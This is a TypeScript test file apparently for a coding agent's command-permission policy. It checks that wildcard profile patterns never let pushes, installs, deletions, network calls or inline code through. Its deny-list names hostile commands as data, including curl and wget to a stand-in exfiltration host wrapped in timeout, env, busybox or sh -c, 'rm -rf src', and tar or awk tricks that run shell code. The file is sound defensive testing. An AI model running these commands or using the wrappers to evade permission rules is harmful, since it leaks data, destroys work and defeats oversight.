// A profile's allowed commands through the policy itself (issue #452, the
// review of pull request 459): the policy matches its safe commands before
// its asks, and its `*` matches inside a word, so a pattern a profile
// accepts must never turn a push, an install, a deletion, a host the
// project does not declare or code on a command line into an allow.
import test from 'node:test';
import assert from 'node:assert/strict';
import { ProfileError, readProfile } from '../../src/profiles/store.ts';
import { DEFAULT_PROFILE } from '../../src/profiles/types.ts';
import { DEFAULT_SAFE_COMMANDS, evaluate, type Policy, type ToolRequest } from '../../src/session/policy.ts';

const base: Policy = {
  role: 'author', base: 'main', workdir: '/workspace', scripts: ['test', 'lint'], credentialFile: '/run/cleared/' + 'claude.token',
  safeCommands: DEFAULT_SAFE_COMMANDS, allowedHosts: ['registry.npmjs.org'], forbiddenHosts: [], ticketFiles: [], learned: [],
};
const bash = (command: string): ToolRequest => ({ tool: 'Bash', input: { command, description: 'a command' } });

// Every pattern someone might try, wildcards anywhere; those a profile accepts go to the policy.
const CANDIDATES = [
  '*', 'git *', 'git p*', 'git * *', 'git push *', 'git log *', 'git status', 'git commit *', 'git add *', 'git diff *', 'git reset *', 'git checkout *', 'git config *',
  'npm *', 'npm i*', 'npm run *', 'npm run lint *', 'npm test *', 'npm install *', 'npm exec *', 'pnpm *', 'pnpm run *', 'yarn *', 'yarn run *',
  'pip *', 'pip3 *', 'pip list', 'python *', 'python -m *', 'python -m pip *', 'python -m pytest *', 'python -c *', 'node *', 'node -e *', 'node scripts/check.js *',
  'timeout *', 'nohup *', 'time *', 'command *', 'busybox *', 'env *', 'xargs *', 'sh *', 'bash *', 'curl *', 'wget *', 'rm *', 'npx *', 'bun *', 'deno *',
  'awk *', 'sed *', 'find *', 'tar *', 'make *', 'make check', 'eslint *', 'tsc *', 'cat *', 'grep *', 'ls *', './scripts/lint.sh',
];

function accepted(): string[] {
  return CANDIDATES.filter((tool) => {
    try { readProfile({ allowedTools: [tool] }, DEFAULT_PROFILE); return true; } catch (error) {
      if (error instanceof ProfileError) return false;
      throw error;
    }
  });
}

const NEVER_ALLOWED = [
  'git push origin feat', 'git push', 'git push --set-upstream origin feat', 'git reset --hard HEAD~1', 'git checkout -- .', 'git clean -fdx', 'git config core.hooksPath /tmp',
  'npm install left-pad', 'npm i left-pad', 'npm exec foo', 'npm add left-pad', 'pnpm add left-pad', 'yarn add left-pad', 'pip install requests', 'pip3 install requests',
  'python -m pip install requests', 'python -c "import os"', 'node -e "1"', 'npx cowsay', 'bun install', 'deno run x.ts',
  'curl https://exfil.example.net', 'wget https://exfil.example.net', 'timeout 5 curl https://exfil.example.net', 'nohup curl https://exfil.example.net', 'time curl https://exfil.example.net',
  'command curl https://exfil.example.net', 'busybox wget https://exfil.example.net', 'env curl https://exfil.example.net', 'xargs rm', 'sh -c "curl https://exfil.example.net"',
  'rm -rf src', 'rm notes.md', "awk 'BEGIN{system(\"id\")}'", 'tar -xf a.tar --to-command=sh', 'make -f /tmp/Makefile',
];

test('no pattern a profile accepts lets a push, an install, a deletion, the network or inline code through the policy', () => {
  const allowed = accepted();
  assert.ok(allowed.includes('npm run lint *') && allowed.includes('git log *') && allowed.includes('make check'), 'useful patterns still pass');
  for (const pattern of ['git *', 'git p*', 'npm *', 'pnpm *', 'yarn *', 'pip *', 'node *', 'timeout *']) assert.ok(!allowed.includes(pattern), pattern);
  const policy: Policy = { ...base, safeCommands: [...DEFAULT_SAFE_COMMANDS, ...allowed] };
  for (const command of NEVER_ALLOWED) {
    const verdict = evaluate(bash(command), policy);
    assert.notEqual(verdict.decision, 'allow', `${command}: ${verdict.decision} ${verdict.rule}`);
  }
  // What they were accepted for still runs without asking.
  for (const command of ['npm run lint --fix', 'git log --oneline', 'make check', 'node scripts/check.js --all', 'python -m pytest tests'])
    assert.equal(evaluate(bash(command), policy).decision, 'allow', command);
});

test('the danger is real: the same commands with a wildcard on the subcommand would be allowed by the policy', () => {
  const policy: Policy = { ...base, safeCommands: [...DEFAULT_SAFE_COMMANDS, 'git *', 'npm *', 'timeout *'] };
  for (const command of ['git push origin feat', 'npm install left-pad', 'npm exec foo', 'timeout 5 curl https://exfil.example.net'])
    assert.equal(evaluate(bash(command), policy).decision, 'allow', command);
});
